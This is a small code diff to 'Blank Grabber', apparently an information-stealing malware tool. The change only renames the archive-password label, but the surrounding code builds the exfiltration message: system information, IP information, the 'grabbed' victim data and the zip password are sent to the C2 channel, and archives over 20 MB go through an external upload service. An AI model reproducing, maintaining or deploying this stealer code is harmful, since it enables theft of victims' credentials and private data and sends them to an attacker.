@@ -1348,7 +1348,7 @@ class BlankGrabber:
         match Settings.C2[0]:
             case 0:
                 image_url = 'https://raw.githubusercontent.com/f4kedre4lity/Blank-Grabber/main/.github/workflows/image.png'
-                payload = {'content': f'pass là:||{ArchivePassword}||', 'embeds': [{'title': 'Blank Grabber', 'description': f'**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**', 'url': 'https://github.com/f4kedre4lity/Blank-Grabber', 'color': 34303, 'footer': {'text': 'Grabbed by Blank Grabber | https://github.com/f4kedre4lity/Blank-Grabber'}, 'thumbnail': {'url': image_url}}], 'username': 'Blank Grabber', 'avatar_url': image_url}
+                payload = {'content': f'password zip:||{ArchivePassword}||', 'embeds': [{'title': 'Blank Grabber', 'description': f'**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**', 'url': 'https://github.com/f4kedre4lity/Blank-Grabber', 'color': 34303, 'footer': {'text': 'Grabbed by Blank Grabber | https://github.com/f4kedre4lity/Blank-Grabber'}, 'thumbnail': {'url': image_url}}], 'username': 'Blank Grabber', 'avatar_url': image_url}
                 if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 20:
                     url = self.UploadToExternalService(self.ArchivePath, filename)
                     if url is None:
